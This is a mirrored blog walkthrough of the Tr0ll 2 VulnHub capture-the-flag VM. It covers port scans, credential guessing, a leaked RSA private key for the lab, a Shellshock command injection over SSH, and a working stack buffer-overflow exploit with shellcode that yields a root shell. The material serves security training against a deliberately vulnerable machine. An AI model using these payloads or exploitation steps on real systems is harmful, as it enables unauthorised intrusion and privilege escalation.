@@ -1,0 +1,869 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/tr0ll-2-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="https://highon.coffee/cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>Tr0ll 2 Walkthrough</title>
+<meta name="description" content="Tr0ll: 2 walkthrough - step by step write up for Tr0ll: 2 a VulnHub Boot2Root challenge.">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900">
+<link rel="stylesheet" type="text/css" href="https://highon.coffee/css/screen.css">
+<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="https://highon.coffee/img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+Tr0ll 2 Walkthrough
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+walkthroughs
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+02 Jan 2015
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<div class="coffee-rating">
+<table>
+<tbody>
+<tr>
+<td>
+<p><code>Coffee Difficulty Rating:</code></p>
+</td>
+<td>
+<p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul id="markdown-toc">
+<li><a href="#description" id="markdown-toc-description">Description</a></li>
+<li><a href="#ssh-shellshock" id="markdown-toc-ssh-shellshock">SSH Shellshock</a></li>
+</ul>
+<p>I rooted Tr0ll 1, so thought it would be rude not to try the second VM in the Tr0ll series… <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll 2</a> requires a buffer overflow to perform local escalation, the first VM didn’t require any exploitation. However, like the first VM I’d say this is challenege is more a case of guessing credentials, trying things you think probably wont work.</p>
+<h3 id="description">Description</h3>
+<p><i>
+The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</i>
+</p>
+<p><i>
+Difficulty is beginner++ to intermediate.
+</i></p>
+<p>##Enumeration</p>
+<p>Enumeration process started.</p>
+<p><img src="https://highon.coffee/img/kirk-enumeration.gif" alt="Star Trek Enumeration" /></p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</span>
+</p>
+<span class="output"><br /></span>
+<span class="output">Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-02 19:24 EST<br /></span>
+<span class="output"><br /></span>
+<span class="output">Host is up (0.0026s latency).<br /></span>
+<span class="output">Not shown: 65532 closed ports<br /></span>
+<span class="output">PORT STATE SERVICE VERSION <br /></span>
+<span class="output">21/tcp open ftp vsftpd 2.0.8 or later<br /></span>
+<span class="output">22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br /></span>
+<span class="output">| ssh-hostkey: <br /></span>
+<span class="output">22/tcp open ssh (protocol 2.0)<br /></span>
+<span class="output">| ssh-hostkey: <br /></span>
+<span class="output">| 1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)<br /></span>
+<span class="output">| 2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)<br /></span>
+<span class="output">|_ 256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)<br /></span>
+<span class="output">80/tcp open http Apache httpd 2.2.22 ((Ubuntu))<br /></span>
+<span class="output">|_http-title: Site doesn't have a title (text/html).<br /></span>
+<span class="output">Device type: general purpose<br /></span>
+<span class="output">Running: Linux 3.X<br /></span>
+<span class="output">OS CPE: cpe:/o:linux:linux_kernel:3<br /></span>
+<span class="output">OS details: Linux 3.2 - 3.8<br /></span>
+<span class="output">Network Distance: 2 hops<br /></span>
+<span class="output">Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /></span>
+<span class="output"><br /></span>
+<span class="output">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .<br /></span>
+<span class="output">Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds<br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>###Service Enumeration</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>TCP: 21</code></p></pc>
+</td>
+<td>
+<pc><p>FTP</p></pc>
+</td>
+<td>
+<pc><p>vsftpd 2.0.8 or later</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 22</code></p></pc>
+</td>
+<td>
+<pc><p>SSH</p></pc>
+</td>
+<td>
+<pc><p>OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 80</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.22 ((Ubuntu))</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>###SSH Enumeration</p>
+<p>Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I attempted to login via ssh with <code>Tr0ll</code> password: <code>Tr0ll</code>, it worked ! But I instantly got booted off, tried a few things nothing worked… So I tried FTP.</p>
+<p>###FTP Enumeration</p>
+<p>I tired the same credentials against ftp and discovered a file called “noob” in the ftp root.</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">ftp noob</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">ftp 172.31.31.6</span></p>
+<span class="output"><br /></span>
+<span class="output">Connected to 172.31.31.6<br /></span>
+<span class="output">220 Welcome to Tr0ll FTP... Only noobs stay for a while...<br /></span>
+<span class="output">Name (172.31.31.6:root): Tr0ll<br /></span>
+<span class="output">331 Please specify the password.<br /></span>
+<span class="output">Password:<br /></span>
+<span class="output">230 Login successful.<br /></span>
+<span class="output">Remote system type is UNIX.<br /></span>
+<span class="output">Using binary mode to transfer files.<br /></span>
+<span class="output">ftp&gt; get lmao.zip<br /></span>
+<span class="output">local: lol.pcap remote: lol.pcap<br /></span>
+<span class="output">200 PORT command successful. Consider using PASV.<br /></span>
+<span class="output">150 Opening BINARY mode data connection for lmao.zip (1474 bytes).<br /></span>
+<span class="output">226 Transfer complete.<br /></span>
+<span class="output">80/tcp open http Apache httpd 2.4.7 ((Ubuntu))<br /></span>
+<span class="output">1474 bytes received in 0.02 secs (60.6 kB/s)<br /></span>
+<span class="output">ftp&gt; exit<br /></span>
+<span class="output">221 Goodbye.<br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>Attempting to extract lmao.zip failed, prompting for a <code>noob</code> password.</p>
+<p>Onto the next service then…</p>
+<p>###HTTP Enumeration</p>
+<p><img src="https://highon.coffee/img/star-trek-enumeration.gif" alt="Star Trek HTTP Enumeration" /></p>
+<p>Web browser showed:</p>
+<p><img src="https://highon.coffee/img/blog/tr0ll-me-again.PNG" alt="tr0ll me again" /></p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">nmap --script=http-enum -p80 -n 172.31.31.6</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">nmap --script=http-enum -p80 -n 172.31.31.6</span></p>
+<span class="output"><br /></span>
+<span class="output">Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-2 18:40 GMT<br /></span>
+<span class="output">Nmap scan report for 172.31.31.6<br /></span>
+<span class="output">Host is up (0.00046s latency).<br /></span>
+<span class="output">PORT STATE SERVICE<br /></span>
+<span class="output">80/tcp open http<br /></span>
+<span class="output">| http-enum:<br /></span>
+<span class="output">| /robots.txt: Robots file<br /></span>
+<span class="output"><br /></span>
+<span class="output">Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds<br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>Entering /robots.txt url in the browser rendered:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">User-agent:<span class="k">*</span>
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop</code></pre></figure>
+<p>The slash was stripped off with some sed <code>sed 's./..g' robots.txt</code> dirb was then used to check the following urls.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">-----------------
+DIRB v2.21    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jan  3 08:08:15 2015
+URL_BASE: http://172.31.31.6/
+WORDLIST_FILES: robots.txt
+
+-----------------
+
+GENERATED WORDS: 21                                                            
+
+---- Scanning URL: http://172.31.31.6/ ----
++ http://172.31.31.6//noob <span class="o">(</span>CODE:301|SIZE:309<span class="o">)</span>                                                                               
++ http://172.31.31.6//keep_trying <span class="o">(</span>CODE:301|SIZE:316<span class="o">)</span>                                                                        
++ http://172.31.31.6//dont_bother <span class="o">(</span>CODE:301|SIZE:316<span class="o">)</span>                                                                        
++ http://172.31.31.6//ok_this_is_it <span class="o">(</span>CODE:301|SIZE:318<span class="o">)</span>                                                                      
+
+-----------------
+DOWNLOADED: 21 - FOUND: 4</code></pre></figure>
+<p>They all rendered the same image (301’d).</p>
+<p><img src="https://highon.coffee/img/blog/tr0ll-cats.PNG" alt="tr0ll cats" /></p>
+<p>Nothing exciting was in the page source:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">What did you really think to find here? Try Harder</code></pre></figure>
+<p><code>cat_the_troll.jpg</code> was downloaded from all the above locations from the target and examined.</p>
+<p>ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry).</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Look Deep within y0ur_self <span class="k">for </span>the answer</code></pre></figure>
+<p>I tired this against the previously downloaded <code>lmao.zip</code> file, no luck. I tried <code>y0ur_self</code> as web path like on tr0ll:1</p>
+<p>Success, the web dir contained a text file <code>http://172.31.31.6/y0ur_self/answer.txt</code> scrolling though from the browser it looked like the file was base64 encoded.</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">wget http://172.31.31.6/y0ur_self/answer.txt</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">wget http://172.31.31.6/y0ur_self/answer.txt</span></p>
+<span class="output"><br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>Decoding the file revealed it was massive, the following was used to decode and sort by line length:</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">base64 decoding</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">base64 -d answer.txt &gt; answer-decoded.txt &amp;&amp; awk '{print length, $0;}' answer-decoded.txt | sort -nr | less</span></p>
+<span class="output"><br /></span>
+<span class="output"><br />30 ItCantReallyBeThisEasyRightLOL</span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tried this against <code>lmao.zip</code></p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">unzip lmao.zip</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">unzip lmao.zip</span></p>
+<span class="output">Archive: lmao.zip<br /></span>
+<span class="output">[lmao.zip] noob password:<br /></span>
+<span class="output"> inflating: noob <br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p><img src="https://highon.coffee/img/data-yes-fist.gif" alt="Data Yes Fist" /></p>
+<p>Yes!</p>
+<p>The contents of <code>noob</code></p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+<span class="nv">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class="o">==</span>
+-----END RSA PRIVATE KEY-----</code></pre></figure>
+<h3 id="ssh-shellshock">SSH Shellshock</h3>
+<p>Attempting to login using the discovered key failed, with a messaging saying <code>TRY HARDER LOL!</code>.</p>
+<p><img src="https://highon.coffee/img/vulcan-ragequit.gif" alt="Vulcan Rage Quit" /></p>
+<p>I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message.</p>
+<p>I googled some shellshock options and managed to spawn a shell with:</p>
+<p><code>ssh -i noob <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="781617171a3849414a56494e4056494c4d56494a41">[email&#160;protected]</a> '() { :;}; /bin/bash'</code></p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">shellshock ssh</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">ssh -i noob <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d3bdbcbcb193e2eae1fde2e5ebfde2e7e6fde2e1ea">[email&#160;protected]</a> '() { :;}; /bin/bash'</span></p>
+<span class="output"><br /></span>
+<span class="output">id<br /></span>
+<span class="output">uid=1002(noob) gid=1002(noob) groups=1002(noob)<br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>##Local Enumeration</p>
+<p>Transfered my local enumeration script to the target, disclosing the following odd sticky bit files:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#########################################</span>
+<span class="c">## Sticky Bit                          ##</span>
+<span class="c">#########################################</span>
+
+drwsr-xr-x 3 root root 4096 Dec 29 19:00 /nothing_to_see_here
+drwsr-xr-x 5 root root 4096 Oct  4 22:36 /nothing_to_see_here/choose_wisely
+drwsr-xr-x 2 root root 4096 Oct  5 21:19 /nothing_to_see_here/choose_wisely/door2
+drwsr-xr-x 2 root root 4096 Oct  5 21:18 /nothing_to_see_here/choose_wisely/door3
+drwsr-xr-x 2 root root 4096 Oct  4 22:19 /nothing_to_see_here/choose_wisely/door1</code></pre></figure>
+<p>Each of the door directories contained a file called r00t, du -sh * in the parent dir <code>choose_wisely</code> showed one of the files was larger - I started there.</p>
+<p><code>od -S 1 r00t</code> was used against each of the files, the larget file contained:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">0017545 bof.c
+0017553 __init_array_end
+0017574 _DYNAMIC
+0017605 __init_array_start
+0017630 _GLOBAL_OFFSET_TABLE_
+0017656 __libc_csu_fini
+0017676 __i686.get_pc_thunk.bx
+0017725 data_start
+0017740 <span class="nb">printf</span>@@GLIBC_2.0
+0017762 _edata
+0017771 _fini
+0017777 <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2350575140535a63">[email&#160;protected]</a>@GLIBC_2.0
+0020021 __DTOR_END__
+0020036 __data_start
+0020053 __gmon_start__
+0020072 <span class="nb">exit</span>@@GLIBC_2.0
+0020112 __dso_handle
+0020127 _IO_stdin_used
+0020146 <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e1bebe8d888382be9295809395be8c80888fa1">[email&#160;protected]</a>@GLIBC_2.0
+0020203 __libc_csu_init</code></pre></figure>
+<p>bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it’s more tr0ling).</p>
+<p>##Exploit Development</p>
+<p>###Fuzzing</p>
+<p>I started by fuzzing with 300 A’s:</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">fuzzing linux binary</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">./r00t $(python -c 'print "A" *300')</span></p>
+<span class="output"><br /></span>
+<span class="output">Segmentation fault<br /></span>
+&lt;/p&gt;
+</div>
+</div>
+</section>
+<p>Bangin’ then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 <code>Illegal instruction</code>.</p>
+<p>Using gdb I located the address of ESP.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>gdb<span class="o">)</span> i r esp
+esp            0xbffffb80 0xbffffb80</code></pre></figure>
+<p>Padded with some NOPs - for a reliable landing.</p>
+<p><img src="https://highon.coffee/img/warf-jump.gif" alt="Worf jump" /></p>
+<p>Overwrote EIP with the location of ESP and tagged some shellcode on the end to exectute a shell.</p>
+<p>###Final Exploit</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./r00t <span class="k">$(</span>python -c <span class="s1">'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'</span><span class="k">)</span></code></pre></figure>
+<p>Note: gdb drops privileges on SUID, in order to spawn the new shell with SUID you need to execute the exploit outside of gdb, or the shell will spawn as the unprivileged user.</p>
+<p>The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the vulnerable binary.</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">Exploit Process</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">du -sh *<br /></span>
+</p>
+<p class="line">
+<span class="output">12K door1<br /></span>
+</p>
+<p class="line">
+<span class="output">12K door2<br /></span>
+</p>
+<p class="line">
+<span class="output">16K door3<br /></span>
+</p>
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">cd door3<br /></span>
+</p>
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * <br />10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\<br />xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')</span>
+</p>
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">whoami<br /></span>
+<span class="output">root<br /></span>
+<span class="output"><br /></span>
+</p>
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">cat /root/Proof.txt<br /></span>
+<span class="output">You win this time young Jedi...</span>
+<span class="output"><br /></span>
+<span class="output">a70354f0258dcc00292c72aab3c8b1e4<br /></span>
+</p>
+</div>
+</div>
+</section>
+<p>##Root dance</p>
+<p><img src="https://highon.coffee/img/girl-dancing-excited.gif" alt="Root Dance" /></p>
+<p>##Thanks</p>
+<p>Thanks to <a href="https://twitter.com/@maleus21">@maleus21</a> for creating this VM challenege.</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=Tr0ll%202%20Walkthrough&amp;url=https://highon.coffee/blog/tr0ll-2-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/tr0ll-2-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/tr0ll-2-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/tr0ll-2-walkthrough/&amp;title=Tr0ll%202%20Walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
